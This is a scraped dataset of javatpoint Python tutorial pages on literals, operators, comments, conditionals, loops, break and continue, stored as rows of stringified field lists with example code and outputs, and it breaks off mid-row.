9,['Python Literals'],['Python Literals can be defined as data that is given in a variable or constant.'],"['https://www.javatpoint.com/python-operators', 'https://www.javatpoint.com/python-keywords', 'https://www.javatpoint.com/python-operators', 'https://www.javatpoint.com/python-keywords', 'https://www.javatpoint.com/python-operators']",[],[],[],"['1. String literals:', 'II. Numeric literals:', 'III. Boolean literals:', 'IV. Special literals.', 'V. Literal Collections.']",[],"['Python supports the following literals:', 'String literals can be formed by enclosing a text in the quotes. We can use both single as well as double quotes to create a string.', 'Types of Strings:', 'There are two types of Strings supported in Python:', 'a) Single-line String- Strings that are terminated within a single-line are known as Single line Strings.', 'b) Multi-line String - A piece of text that is written in multiple lines is known as multiple lines string.', 'There are two ways to create multiline strings:', '1) Adding black slash at the end of each line.', '2) Using triple quotation marks:-', 'Numeric Literals are immutable. Numeric literals can belong to following four different numerical types.', 'Example - Numeric Literals', 'A Boolean literal can have any of the two values: True or False.', 'Example - Boolean Literals', 'Python contains one special literal i.e., None.', 'None is used to specify to that field that is not created. It is also used for the end of lists in Python.', 'Example - Special Literals ', 'Python provides the four types of literal collection such as List literals, Tuple literals, Dict literals, and Set literals.', 'Example - List literals', 'Dictionary:', 'Example: - Set Literals']",[],[],"['""Aman"" , \'12345\'', ""text1='hello'"", ""text1='hello\\"", 'print(text1)', ""str2='''welcome"", ""SSSIT'''"", 'print str2', 'x = 0b10100 #Binary Literals', 'y = 100 #Decimal Literal', 'z = 0o215 #Octal Literal', 'u = 0x12d #Hexadecimal Literal', '#Float Literal', 'float_1 = 100.5', 'float_2 = 1.5e2', '#Complex Literal', 'a = 5+3.14j', 'print(x, y, z, u)', 'print(float_1, float_2)', 'print(a, a.imag, a.real)', 'x = (1 == True)', 'y = (2 == False)', 'z = (3 == True)', 'a = True + 10', 'b = False + 10', 'print(""x is"", x)', 'print(""y is"", y)', 'print(""z is"", z)', 'print(""a:"", a)', 'print(""b:"", b)', 'val1=10', 'val2=None', 'print(val1)', 'print(val2)', ""list=['John',678,20.4,'Peter']"", ""list1=[456,'Andrew']"", 'print(list)', 'print(list + list1)', ""dict = {'name': 'Pater', 'Age':18,'Roll_nu':101}"", 'print(dict)', 'tup = (10,20,""Dev"",[2,3,4])', 'print(tup)', ""set = {'apple','grapes','guava','papaya'}"", 'print(set)']","[""'hellouser'"", 'welcome  \nto  \nSSSIT', '20 100 141 301\n100.5 150.0\n(5+3.14j) 3.14 5.0', 'x is True\ny is False\nz is False\na: 11\nb: 10', '10\nNone', ""['John', 678, 20.4, 'Peter']\n['John', 678, 20.4, 'Peter', 456, 'Andrew']"", ""{'name': 'Pater', 'Age': 18, 'Roll_nu': 101}"", ""(10, 20, 'Dev', [2, 3, 4])"", ""{'guava', 'apple', 'papaya', 'grapes'}""]",['nt(signed integers)Long(long integers)float(floating point)Complex(complex&&&umbers( can be both positive and negative) with no fractional part.eg: 100Integers of unlimited size followed by lowercase or uppercase L eg: 87032845LReal numbers with both integer and fractional part eg: -26.2In the form of a+bj where a forms the real part and b forms the imaginary part of the complex number. eg: 3.14'],"['|||List contains items of different data types. Lists are mutable i.e., modifiable.|||The values stored in List are separated by comma(,) and enclosed within square brackets([]). We can store different types of data in a List.||||||Python dictionary stores the data in the key-value pair.|||It is enclosed by curly-braces {} and each pair is separated by the commas(,).||||||Python tuple is a collection of different data-type. It is immutable which means it cannot be modified after creation.|||It is enclosed by the parentheses () and each element is separated by the comma(,).||||||Python set is the collection of the unordered dataset.|||It is enclosed by the {} and each element is separated by the comma(,).|||']"
10,['Python Operators'],"['The operator can be defined as a symbol which is responsible for a particular operation between two operands. Operators are the pillars of a program on which the logic is built in a specific programming language. Python provides a variety of operators, which are described as follows.']","['https://www.javatpoint.com/python-comments', 'https://www.javatpoint.com/python-literals', 'https://www.javatpoint.com/python-comments', 'https://www.javatpoint.com/python-literals', 'https://www.javatpoint.com/python-comments']",[],[],"['Arithmetic Operators', 'Comparison operator ', 'Assignment Operators', 'Bitwise Operators', 'Logical Operators', 'Membership Operators', 'Identity Operators', 'Operator Precedence']",[],[],"['Consider the following table for a detailed explanation of arithmetic operators.', 'The bitwise operators perform bit by bit operation on the values of the two operands. Consider the following example.', 'For example, ', 'The logical operators are used primarily in the expression evaluation to make a decision. Python supports the following logical operators.', 'The identity operators are used to decide whether an element certain class or type. ']","['Arithmetic operators are used to perform arithmetic operations between two operands. It includes + (addition), - (subtraction), *(multiplication), /(divide), %(reminder), //(floor division), and exponent (**) operators.', 'Comparison operators are used to comparing the value of the two operands and returns Boolean true or false accordingly. The comparison operators are described in the following table.', 'The assignment operators are used to assign the value of the right expression to the left operand. The assignment operators are described in the following table.', 'Python membership operators are used to check the membership of value inside a Python data structure. If the value is present in the data structure, then the resulting value is true otherwise it returns false.', 'The precedence of the operators is essential to find out since it enables us to know which operator should be evaluated first. The precedence table of the operators in Python is given below.']",[],"['if a = 7', 'b = 6', 'then, binary (a) = 0111', 'binary (b) = 0110', 'hence, a & b = 0011', 'a | b = 0111', 'a ^ b = 0100', '~ a = 1000']",[],"['Operator|||Description&&&+ (Addition)|||It is used to add two operands. For example, if a = 20, b = 10 => a+b = 30&&&- (Subtraction)|||It is used to subtract the second operand from the first operand. If the first operand is less than the second operand, the value results negative. For example, if a = 20, b = 10 => a - b = 10&&&/ (divide)|||It returns the quotient after dividing the first operand by the second operand. For example, if a = 20, b = 10 => a/b = 2.0&&&* (Multiplication)|||It is used to multiply one operand with the other. For example, if a = 20, b = 10 => a * b = 200&&&% (reminder)|||It returns the reminder after dividing the first operand by the second operand. For example, if a = 20, b = 10 => a%b = 0&&&** (Exponent)|||It is an exponent operator represented as it calculates the first operand power to the second operand.&&&// (Floor division)|||It gives the floor value of the quotient produced by dividing the two operands.', 'Operator|||Description&&&==|||If the value of two operands is equal, then the condition becomes true.&&&!=|||If the value of two operands is not equal, then the condition becomes true.&&&<=|||If the first operand is less than or equal to the second operand, then the condition becomes true.&&&>=|||If the first operand is greater than or equal to the second operand, then the condition becomes true.&&&>|||If the first operand is greater than the second operand, then the condition becomes true.&&&<|||If the first operand is less than the second operand, then the condition becomes true.', 'Operator|||Description&&&= |||It assigns the value of the right expression to the left operand.&&&+= |||It increases the value of the left operand by the value of the right operand and assigns the modified value back to left operand. For example, if a = 10, b = 20 => a+ = b will be equal to a = a+ b and therefore, a = 30.&&&-=|||It decreases the value of the left operand by the value of the right operand and assigns the modified value back to left operand. For example, if a = 20, b = 10 => a- = b will be equal to a = a- b and therefore, a = 10.&&&*=|||It multiplies the value of the left operand by the value of the right operand and assigns the modified value back to then the left operand. For example, if a = 10, b = 20 => a* = b will be equal to a = a* b and therefore, a = 200.&&&%=|||It divides the value of the left operand by the value of the right operand and assigns the reminder back to the left operand. For example, if a = 20, b = 10 => a % = b will be equal to a = a % b and therefore, a = 0.&&&**=|||a**=b will be equal to a=a**b, for example, if a = 4, b =2, a**=b will assign 4**2 = 16 to a.&&&//=|||A//=b will be equal to a = a// b, for example, if a = 4, b = 3, a//=b will assign 4//3 = 1 to a.', 'Operator|||Description&&&& (binary and)|||If both the bits at the same place in two operands are 1, then 1 is copied to the result. Otherwise, 0 is copied.&&&| (binary or)|||The resulting bit will be 0 if both the bits are zero; otherwise, the resulting bit will be 1.&&&^ (binary xor)|||The resulting bit will be 1 if both the bits are different; otherwise, the resulting bit will be 0.&&&~ (negation) |||It calculates the negation of each bit of the operand, i.e., if the bit is 0, the resulting bit will be 1 and vice versa.&&&<< (left shift)|||The left operand value is moved left by the number of bits present in the right operand.&&&>> (right shift)|||The left operand is moved right by the number of bits present in the right operand.', 'Operator|||Description&&&and|||If both the expression are true, then the condition will be true. If a and b are the two expressions, a → true, b → true => a and b → true.&&&or|||If one of the expressions is true, then the condition will be true. If a and b are the two expressions, a → true, b → false => a or b → true.&&&not|||If an expression a is true, then not (a) will be false and vice versa.', 'Operator|||Description&&&in|||It is evaluated to be true if the first operand is found in the second operand (list, tuple, or dictionary).&&&not in|||It is evaluated to be true if the first operand is not found in the second operand (list, tuple, or dictionary).', 'Operator|||Description&&&is|||It is evaluated to be true if the reference present at both sides point to the same object.&&&is not|||It is evaluated to be true if the reference present at both sides do not point to the same object.', 'Operator|||Description&&&**|||The exponent operator is given priority over all the others used in the expression.&&&~ + -|||The negation, unary plus, and minus.&&&* / % //|||The multiplication, divide, modules, reminder, and floor division.&&&+ -|||Binary plus, and minus&&&>> <<|||Left shift. and right shift&&&&|||Binary and.&&&^ ||||Binary xor, and or&&&<= < > >=|||Comparison operators (less than, less than equal to, greater than, greater then equal to).&&&<> == !=|||Equality operators.&&&= %= /= //= -= +=|||*= **=|||Assignment operators&&&is is not|||Identity operators&&&in not in|||Membership operators&&&not or and|||Logical operators']",['|||Arithmetic operators|||Comparison operators|||Assignment Operators|||Logical Operators|||Bitwise Operators|||Membership Operators|||Identity Operators|||']
11,['Python Comments'],"['Python Comment is an essential tool for the programmers. Comments are generally used to explain the code. We can easily understand the code if it has a proper explanation. A good programmer must use the comments because in the future anyone wants to modify the code as well as implement the new module; then, it can be done easily.']","['https://www.javatpoint.com/python-if-else', 'https://www.javatpoint.com/python-operators', 'https://www.javatpoint.com/python-if-else', 'https://www.javatpoint.com/python-operators', 'https://www.javatpoint.com/python-if-else']",[],[],"['Multiline Python Comment', 'Docstrings Python Comment', 'Python indentation']",[],"['Note: The docstring must be the first thing in the function; otherwise, Python interpreter cannot get the docstring.']","[""Let's understand the following example."", 'Here we have written comment over the print statement using the hash(#). It will not affect our print statement.', 'We must use the hash(#) at the beginning of every line of code to apply the multiline Python comment. Consider the following example.', ""We can check a function's docstring by using the __doc__ attribute."", 'Generally, four whitespaces are used as the indentation. The amount of indentation depends on user, but it must be consistent throughout that block.', 'To indicate a block of code we indented each line of the block by the same whitespaces.', 'Consider the following example.', 'If the indentation is not used properly, then that will result in IndentationError.']","['The above code is very readable even the absolute beginners can under that what is happening in each line of the code. This is the advantage of using comments in code.', ""We can also use the triple quotes ('''''') for multiline comment. The triple quotes are also used to string formatting. Consider the following example."", 'The docstring comment is mostly used in the module, function, class or method. It is a documentation Python string. We will explain the class/method in further tutorials.', 'Python indentation uses to define the block of the code. The other programming languages such as C, C++, and Java use curly braces {}, whereas Python uses an indentation. Whitespaces are used as indentation in Python.', 'Indentation uses at the beginning of the code and ends with the unintended line. That same line indentation defines the block of the code (body of a function, loop, etc.)', 'The above code, if and else are two separate code blocks. Both code blocks are indented four spaces. The print(""Task Complete"") statement is not indented four whitespaces and it is out of the if-else block.']","['In the other programming language such as C++, It provides the // for single-lined comment and /*.... */ for multiple-lined comment, but Python provides the single-lined Python comment. To apply the comment in the code we use the hash(#) at the beginning of the statement or code.']","['# This is the print statement', 'print(""Hello Python"")', '# First line of the comment', '# Second line of the comment', '# Third line of the comment', '# Variable a holds value 5', '# Variable b holds value 10', '# Variable c holds sum of a and b', '# Print the result', 'c = a+b', 'print(""The sum is:"", c)', 'def intro():', 'This function prints Hello Joseph', 'print(""Hi Joseph"")', 'intro()', 'def intro():', 'This function prints Hello Joseph', 'print(""Hello Joseph"")', 'intro.__doc__', 'for i in range(5):', 'print(i)', 'if(i == 3):', 'break', 'dn = int(input(""Enter the number:""))', 'if(n%2 == 0):', 'print(""Even Number"")', 'print(""Odd Number"")', 'print(""Task Complete"")']","['# This is the print statement', 'print(""Hello Python"")', '# First line of the comment', '# Second line of the comment', '# Third line of the comment', '# Variable a holds value 5', '# Variable b holds value 10', '# Variable c holds sum of a and b', '# Print the result', 'a = 5', 'b = 10', 'c = a+b', 'print(""The sum is:"", c)', 'The sum is: 15', 'def intro():', '""""""', 'This function prints Hello Joseph', '""""""', 'print(""Hi Joseph"")', 'intro()', 'Hello Joseph', 'def intro():', '""""""', 'This function prints Hello Joseph', '""""""', 'print(""Hello Joseph"")', 'intro.__doc__', 'Output:', ""'\\n  This function prints Hello Joseph\\n  '"", 'for i in range(5):', 'print(i)', 'if(i == 3):', 'break', 'dn = int(input(""Enter the number:""))', 'if(n%2 == 0):', 'print(""Even Number"")', 'else:', 'print(""Odd Number"")', '', 'print(""Task Complete"")', 'Enter the number: 10', 'Even Number', 'Task Complete']",[],[]
12,['Python If-else statements '],"['Decision making is the most important aspect of almost all the programming languages. As the name implies, decision making allows us to run a particular block of code for a particular decision. Here, the decisions are made on the validity of the particular conditions. Condition checking is the backbone of decision making. ']","['https://www.javatpoint.com/python-loops', 'https://www.javatpoint.com/python-comments', 'https://www.javatpoint.com/python-loops', 'https://www.javatpoint.com/python-comments', 'https://www.javatpoint.com/python-loops']","['https://static.javatpoint.com/python/images/python-if-statement.png', 'https://static.javatpoint.com/python/images/python-if-else-statement.png', 'https://static.javatpoint.com/python/images/python-elif-statement.png']",[],"['Indentation in Python', 'The if statement', 'The if-else statement ', 'The elif statement']","['Example 1', 'Example 2 : Program to print the largest of the three numbers. ', 'Example 1 : Program to check whether a person is eligible to vote or not.', 'Example 2: Program to check whether a number is even or not. ', 'Example 1', 'Example 2']",[],"['In python, decision making is performed by the following statements. ', 'Generally, four spaces are given to indent the statements which are a typical amount of indentation in python.', 'The syntax of the if-statement is given below. ', 'The if-else statement provides an else block combined with the if statement which is executed in the false case of the condition. ', 'If the condition is true, then the if-block is executed. Otherwise, the else-block is executed. ', 'The syntax of the if-else statement is given below. ', 'The elif statement works like an if-else-if ladder statement in C. It must be succeeded by an if statement. ', 'The syntax of the elif statement is given below. ']","['The if statement is used to test a particular condition and if the condition is true, it executes a block of code known as if-block. The condition of if statement can be any valid logical expression which can be either evaluated to true or false. ']","[""For the ease of programming and to achieve simplicity, python doesn't allow the use of parentheses for the block level code. In Python, indentation is used to declare a block. If two statements are at the same indentation level, then they are the part of the same block. "", 'Indentation is the most used part of the python language since it declares the block of code. All the statements of one block are intended at the same level indentation. We will see how the actual indentation takes place in decision making and other stuff in python.', 'The elif statement enables us to check multiple conditions and execute the specific block of statements depending upon the true condition among them. We can have any number of elif statements in our program depending upon our need. However, using elif is optional. ']","['if expression:', 'statement', 'num = int(input(""enter the number?""))', 'if num%2 == 0:', 'print(""Number is even"")', 'a = int(input(""Enter a? ""));', 'b = int(input(""Enter b? ""));', 'c = int(input(""Enter c? ""));', 'if a>b and a>c:', 'print(""a is largest"");', 'if b>a and b>c:', 'print(""b is largest"");', 'if c>a and c>b:', 'print(""c is largest"");', 'if condition:', '#block of statements', '#another block of statements (else-block)', 'age = int (input(""Enter your age? ""))', 'if age>=18:', 'print(""You are eligible to vote !!"");', 'print(""Sorry! you have to wait !!"");', 'num = int(input(""enter the number?""))', 'if num%2 == 0:', 'print(""Number is even..."")', 'print(""Number is odd..."")', 'if expression 1:', '# block of statements', 'elif expression 2:', '# block of statements', 'elif expression 3:', '# block of statements', '# block of statements', 'number = int(input(""Enter the number?""))', 'if number==10:', 'print(""number is equals to 10"")', 'elif number==50:', 'print(""number is equal to 50"");', 'elif number==100:', 'print(""number is equal to 100"");', 'print(""number is not equal to 10, 50 or 100"");', 'marks = int(input(""Enter the marks? ""))', 'if marks > 85 and marks <= 100:', 'print(""Congrats ! you scored grade A ..."")', 'elif marks > 60 and marks <= 85:', 'print(""You scored grade B + ..."")', 'elif marks > 40 and marks <= 60:', 'print(""You scored grade B ..."")', 'elif (marks > 30 and marks <= 40):', 'print(""You scored grade C ..."")', 'print(""Sorry you are fail ?"")']","['enter the number?10\nNumber is even', 'Enter a? 100\nEnter b? 120\nEnter c? 130\nc is largest', 'Enter your age? 90\nYou are eligible to vote !!', 'enter the number?10\nNumber is even', 'Enter the number?15\nnumber is not equal to 10, 50 or 100']","['Statement|||Description|||||||||If Statement |||The if statement is used to test a specific condition. If the condition is true, a block of code (if-block) will be executed.|||||||||If - else Statement|||The if-else statement is similar to if statement except the fact that, it also provides the block of the code for the false case of the condition to be checked. If the condition provided in the if statement is false, then the else statement will be executed. |||||||||Nested if Statement|||Nested if statements enable us to use if ? else statement inside an outer if statement. |||&&&|||If Statement |||The if statement is used to test a specific condition. If the condition is true, a block of code (if-block) will be executed.|||||||||If - else Statement|||The if-else statement is similar to if statement except the fact that, it also provides the block of the code for the false case of the condition to be checked. If the condition provided in the if statement is false, then the else statement will be executed. |||||||||Nested if Statement|||Nested if statements enable us to use if ? else statement inside an outer if statement. |||&&&If Statement |||The if statement is used to test a specific condition. If the condition is true, a block of code (if-block) will be executed.&&&If - else Statement|||The if-else statement is similar to if statement except the fact that, it also provides the block of the code for the false case of the condition to be checked. If the condition provided in the if statement is false, then the else statement will be executed. &&&Nested if Statement|||Nested if statements enable us to use if ? else statement inside an outer if statement. ']",[]
13,['Python Loops '],['The flow of the programs written in any programming language is sequential by default. Sometimes we may need to alter the flow of the program. The execution of a specific code may need to be repeated several numbers of times. '],"['https://www.javatpoint.com/python-for-loop', 'https://www.javatpoint.com/python-if-else', 'https://www.javatpoint.com/python-for-loop', 'https://www.javatpoint.com/python-if-else', 'https://www.javatpoint.com/python-for-loop']",['https://static.javatpoint.com/python/images/python-loops.png'],[],"['Why we use loops in python? ', 'Advantages of loops ']",[],[],"['There are the following advantages of loops in Python. ', 'There are the following loop statements in Python. ']","['For this purpose, The programming languages provide various types of loops which are capable of repeating some specific code several numbers of times. Consider the following diagram to understand the working of a loop statement. ']","['The looping simplifies the complex problems into the easy ones. It enables us to alter the flow of the program so that instead of writing the same code again and again, we can repeat the same code for a finite number of times. For example, if we need to print the first 10 natural numbers then, instead of using the print statement 10 times, we can print inside a loop which runs up to 10 iterations.']",[],[],"[""Loop Statement|||Description&&&for loop |||The for loop is used in the case where we need to execute some part of the code until the given condition is satisfied. The for loop is also called as a per-tested loop. It is better to use for loop if the number of iteration is known in advance.&&&while loop |||The while loop is to be used in the scenario where we don't know the number of iterations in advance. The block of statements is executed in the while loop until the condition specified in the while loop is satisfied. It is also called a pre-tested loop.&&&do-while loop|||The do-while loop continues until a given condition satisfies. It is also called post tested loop. It is used when it is necessary to execute the loop at least once (mostly menu driven programs).""]","['|||It provides code re-usability.|||Using loops, we do not need to write the same code again and again.|||Using loops, we can traverse over the elements of data structures (array or linked lists).|||']"
14,['Python for loop'],"['The for loop in Python is used to iterate the statements or a part of the program several times. It is frequently used to traverse the data structures like list, tuple, or dictionary.']","['https://www.javatpoint.com/python-while-loop', 'https://www.javatpoint.com/python-loops', 'https://www.javatpoint.com/python-while-loop', 'https://www.javatpoint.com/python-loops', 'https://www.javatpoint.com/python-while-loop']",['https://static.javatpoint.com/python/images/python-for-loop.png'],[],"['Nested for loop in python', 'Using else statement with for loop']","['The for loop flowchart', 'For loop Using Sequence', 'For loop Using range() function', 'Example-2: Program to number pyramid.']",[],"['The syntax of for loop in python is given below.', 'Example-1: Iterating string using for loop', 'Example- 2: Program to print the table of the given number .', 'Example-4: Program to print the sum of the given list.', 'The range() function', 'Consider the following examples:', 'Example-1: Program to print numbers in sequence.', 'Example - 2: Program to print table of given number.', 'Example-3: Program to print even number using step size in range().', 'The for loop completely exhausted, since there is no break.', 'The loop is broken due to the break statement...came out of the loop. We will learn more about the break statement in next tutorial.']","['The range() function is used to generate the sequence of the numbers. If we pass the range(10), it will generate the numbers from 0 to 9. The syntax of the range() function is given below.', 'We can also use the range() function with sequence of numbers. The len() function is combined with range() function which iterate through a sequence using indexing. Consider the following example.', 'Python allows us to nest any number of for loops inside a for loop. The inner loop is executed n number of times for every iteration of the outer loop. The syntax is given below.', 'In the above example, the loop is broken due to the break statement; therefore, the else statement will not be executed. The statement present immediate next to else block will be executed.']","['Unlike other languages like C, C++, or Java, Python allows us to use the else statement with the for loop which can be executed only when all the iterations are exhausted. Here, we must notice that if the loop contains any of the break statement then the else statement will not be executed.']","['for iterating_var in sequence:', 'statement(s)', 'str = ""Python""', 'for i in str:', 'print(i)', 'list = [1,2,3,4,5,6,7,8,9,10]', 'for i in list:', 'c = n*i', 'print(c)', 'list = [10,30,23,43,65,12]', 'sum = 0', 'for i in list:', 'sum = sum+i', 'print(""The sum is:"",sum)', 'range(start,stop,step size)', 'for i in range(10):', ""print(i,end = ' ')"", 'n = int(input(""Enter the number ""))', 'for i in range(1,11):', 'c = n*i', 'print(n,""*"",i,""="",c)', 'n = int(input(""Enter the number ""))', 'for i in range(2,n,2):', 'print(i)', ""list = ['Peter','Joseph','Ricky','Devansh']"", 'for i in range(len(list)):', 'print(""Hello"",list[i])', 'for iterating_var1 in sequence:  #outer loop', 'for iterating_var2 in sequence:  #inner loop', '#block of statements', '#Other statements', '# User input for number of rows', 'rows = int(input(""Enter the rows:""))', '# Outer loop will print number of rows', 'for i in range(0,rows+1):', '# Inner loop will print number of Astrisk', 'for j in range(i):', 'print(""*"",end = \'\')', 'print()', 'rows = int(input(""Enter the rows""))', 'for i in range(0,rows+1):', 'for j in range(i):', ""print(i,end = '')"", 'print()', 'for i in range(0,5):', 'print(i)', 'print(""for loop completely exhausted, since there is no break."")', 'for i in range(0,5):', 'print(i)', 'break;', 'else:print(""for loop is exhausted"");', 'print(""The loop is broken due to break statement...came out of the loop"")']","['P', 'y', 't', 'h', 'o', 'n', '5', '10', '15', '20', '25', '30', '35', '40', '45', '50s', 'The sum is: 183', '0 1 2 3 4 5 6 7 8 9', 'Enter the number 10', '10 * 1 = 10', '10 * 2 = 20', '10 * 3 = 30', '10 * 4 = 40', '10 * 5 = 50', '10 * 6 = 60', '10 * 7 = 70', '10 * 8 = 80', '10 * 9 = 90', '10 * 10 = 100', 'Enter the number 20', '2', '4', '6', '8', '10', '12', '14', '16', '18', 'Hello Peter', 'Hello Joseph', 'Hello Ricky', 'Hello Devansh', 'Enter the rows:5', '*', '**', '***', '****', '*****', '1', '22', '333', '4444', '55555', '0', '1', '2', '3', '4', 'for loop completely exhausted, since there is no break.', '0']",[],"['|||The start represents the beginning of the iteration.|||The stop represents that the loop will iterate till stop-1. The range(1,5) will generate numbers 1 to 4 iterations. It is optional.|||The step size is used to skip the specific numbers from the iteration. It is optional to use. By default, the step size is 1. It is optional.|||']"
15,['Python While loop'],['The Python while loop allows a part of the code to be executed until the given condition returns false. It is also known as a pre-tested loop.'],"['https://www.javatpoint.com/python-break', 'https://www.javatpoint.com/python-for-loop', 'https://www.javatpoint.com/python-break', 'https://www.javatpoint.com/python-for-loop', 'https://www.javatpoint.com/python-break']",['https://static.javatpoint.com/python/images/python-while-loop.png'],[],"['Loop Control Statements', 'Infinite while loop', 'Using else with while loop']","['While loop Flowchart', 'Example-1: Program to print 1 to 10 using while loop', 'Example -2: Program to print table of given numbers.', 'Example 1', 'Example 2', 'Example 1', 'Example 2', 'Example-3 Program to print Fibonacci numbers to given limit']",[],"[""It can be viewed as a repeating if statement. When we don't know the number of iterations then the while loop is most effective to use."", 'The syntax is given below.', '2. Break Statement -  When the break statement is encountered, it brings control out of the loop.', 'If the condition is given in the while loop never becomes false, then the while loop will never terminate, and it turns into the infinite while loop.', 'In the above code, when the break statement encountered, then while loop stopped its execution and skipped the else statement.']","['Here, the statements can be a single statement or a group of statements. The expression should be any valid Python expression resulting in true or false. The true is any non-zero value and false is 0.', ""1. Continue Statement -  When the continue statement is encountered, the control transfer to the beginning of the loop. Let's understand the following example."", ""3. Pass Statement -  The pass statement is used to declare the empty loop. It is also used to define empty class, function, and control statement. Let's understand the following example."", 'Any non-zero value in the while loop indicates an always-true condition, whereas zero indicates the always-false condition. This type of approach is useful if we want our program to run continuously in the loop without any disturbance.']","[""We can change the normal sequence of while loop's execution using the loop control statement. When the while loop's execution is completed, all automatic objects defined in that scope are demolished. Python offers the following control statement to use within the while loop."", 'Python allows us to use the else statement with the while loop also. The else block is executed when the condition given in the while statement becomes false. Like for loop, if the while loop is broken using break statement, then the else block will not be executed, and the statement present after else block will be executed. The else statement is optional to use with the while loop. Consider the following example.']","['while expression:', 'statements', ""# prints all letters except 'a' and 't'"", ""str1 = 'javatpoint'"", 'while i < len(str1):', ""if str1[i] == 'a' or str1[i] == 't':"", 'i += 1', 'continue', ""print('Current Letter :', a[i])"", '# The control transfer is transfered', '# when break statement soon it sees t', ""str1 = 'javatpoint'"", 'while i < len(str1):', ""if str1[i] == 't':"", 'i += 1', ""print('Current Letter :', str1[i])"", '# An empty loop', ""str1 = 'javatpoint'"", 'while i < len(str1):', ""print('Value of i :', i)"", '#The while loop will iterate until condition becomes false.', 'While(i<=10):', 'print(i)', 'i=i+1', 'number=0', 'number = int(input(""Enter the number:""))', 'while i<=10:', 'print(""%d X %d = %d \\n""%(number,i,number*i))', 'i = i+1', 'while (1):', 'print(""Hi! we are inside the infinite while loop"")', 'var = 1', 'while(var != 2):', 'i = int(input(""Enter the number:""))', 'print(""Entered value is %d""%(i))', 'while(i<=5):', 'print(i)', 'i=i+1', 'print(""The while loop exhausted"")', 'while(i<=5):', 'print(i)', 'i=i+1', 'if(i==3):', 'break', 'print(""The while loop exhausted"")', 'terms = int(input(""Enter the terms ""))', '# first two intial terms', 'count = 0', '# check if the number of terms is Zero or negative', 'if (terms <= 0):', 'print(""Please enter a valid integer"")', 'elif (terms == 1):', 'print(""Fibonacci sequence upto"",limit,"":"")', 'print(a)', 'print(""Fibonacci sequence:"")', 'while (count < terms) :', ""print(a, end = ' ')"", 'c = a + b', '# updateing values', 'a = b', 'b = c', 'count += 1']","['Current Letter : j\nCurrent Letter : v\nCurrent Letter : p\nCurrent Letter : o\nCurrent Letter : i\nCurrent Letter : n', 'Current Letter : j\nCurrent Letter : a\nCurrent Letter : v\nCurrent Letter : a', 'Value of i : 10', '1\n2\n3\n4\n5\n6\n7\n8\n9\n10', 'Enter the number:10\n10 X 1 = 10 \n\n10 X 2 = 20 \n\n10 X 3 = 30 \n\n10 X 4 = 40 \n\n10 X 5 = 50 \n\n10 X 6 = 60 \n\n10 X 7 = 70 \n\n10 X 8 = 80 \n\n10 X 9 = 90 \n\n10 X 10 = 100', 'Hi! we are inside the infinite while loop\nHi! we are inside the infinite while loop', 'Enter the number:10\nEntered value is 10\nEnter the number:10\nEntered value is 10\nEnter the number:10\nEntered value is 10\nInfinite time', '1\n2', 'Enter the terms 10\nFibonacci sequence:\n0 1 1 2 3 5 8 13 21 34']",[],[]
16,['Python break statement'],"['The break is a keyword in python which is used to bring the program control out of the loop. The break statement breaks the loops one by one, i.e., in the case of nested loops, it breaks the inner loop first and then proceeds to outer loops. In other words, we can say that break is used to abort the current execution of the program and the control goes to the next line after the loop. ']","['https://www.javatpoint.com/python-continue', 'https://www.javatpoint.com/python-while-loop', 'https://www.javatpoint.com/python-continue', 'https://www.javatpoint.com/python-while-loop', 'https://www.javatpoint.com/python-continue']",[],[],[],[],[],"['The break is commonly used in the cases where we need to break the loop for a given condition. ', 'The syntax of the break is given below.']",[],[],"['#loop statements', 'list =[1,2,3,4]', 'count = 1;', 'for i in list:', 'if i == 4:', 'print(""item matched"")', 'count = count + 1;', 'break', 'print(""found at"",count,""location"");', 'str = ""python""', 'for i in str:', ""if i == 'o':"", 'break', 'print(i);', 'while 1:', 'print(i,"" "",end=""""),', 'i=i+1;', 'if i == 10:', 'break;', 'print(""came out of while loop"");', 'while 1:', 'i=1;', 'while i<=10:', 'print(""%d X %d = %d\\n""%(n,i,n*i));', 'i = i+1;', 'choice = int(input(""Do you want to continue printing the table, press 0 for no?""))', 'if choice == 0:', 'break;', 'n=n+1']","['item matched\nfound at 2 location', 'p\ny\nt\nh', '0  1  2  3  4  5  6  7  8  9  came out of while loop', '2 X 1 = 2\n\n2 X 2 = 4\n\n2 X 3 = 6\n\n2 X 4 = 8\n\n2 X 5 = 10\n\n2 X 6 = 12\n\n2 X 7 = 14\n\n2 X 8 = 16\n\n2 X 9 = 18\n\n2 X 10 = 20\n\nDo you want to continue printing the table, press 0 for no?1\n\n3 X 1 = 3\n\n3 X 2 = 6\n\n3 X 3 = 9\n\n3 X 4 = 12\n\n3 X 5 = 15\n\n3 X 6 = 18\n\n3 X 7 = 21\n\n3 X 8 = 24\n\n3 X 9 = 27\n\n3 X 10 = 30\n\nDo you want to continue printing the table, press 0 for no?0']",[],[]
17,['Python continue Statement'],['The continue statement in Python is used to bring the program control to the beginning of the loop. The continue statement skips the remaining lines of code inside the loop and start with the next iteration. It is mainly used for a particular condition inside the loop so that we can skip some specific code for a particular condition.The continue statement in Python is used to bring the program control to the beginning of the loop. The continue statement skips the remaining lines of code inside the loop and start with the next iteration. It is mainly used for a particular condition inside the loop so that we can skip some specific code for a particular condition.'],"['https://www.javatpoint.com/python-pass', 'https://www.javatpoint.com/python-break', 'https://www.javatpoint.com/python-pass', 'https://www.javatpoint.com/python-break', 'https://www.javatpoint.com/python-pass']",['https://static.javatpoint.com/python/images/python-continue.png'],[],['Pass Statement'],"['Syntax', 'Flow Diagram', 'Example 1', 'Example 2', 'Example']",[],"['Consider the following examples.', ""Let's have a look at another example:"", 'Pass is also used where the code will be written somewhere but not yet written in the program file. Consider the following example.', 'We will learn more about the pass statement in the next tutorial.']","[""The pass statement is a null operation since nothing happens when it is executed. It is used in the cases where a statement is syntactically needed but we don't want to use any executable statement at its place."", ""For example, it can be used while overriding a parent class method in the subclass but don't want to give its specific implementation in the subclass.""]","['Observe the output of above code, the value 5 is skipped because we have provided the if condition using with continue statement in while loop. When it matched with the given condition then control transferred to the beginning of the while loop and it skipped the value 5 from the code.']","['#loop statements', 'continue', '#the code to be skipped', 'i = 0', 'while(i < 10):', 'i = i+1', 'if(i == 5):', 'continue', 'print(i)', 'str = ""JavaTpoint""', 'for i in str:', ""if(i == 'T'):"", 'continue', 'print(i)', 'list = [1,2,3,4,5]', 'flag = 0', 'for i in list:', 'print(""Current element:"",i,end="" "");', 'if i==3:', 'pass', 'print(""\\nWe are inside pass block\\n"");', 'flag = 1', 'if flag==1:', 'print(""\\nCame out of pass\\n"");', 'flag=0']","['1\n2\n3\n4\n6\n7\n8\n9\n10', 'J\na\nv\na\np\no\ni\nn\nt', 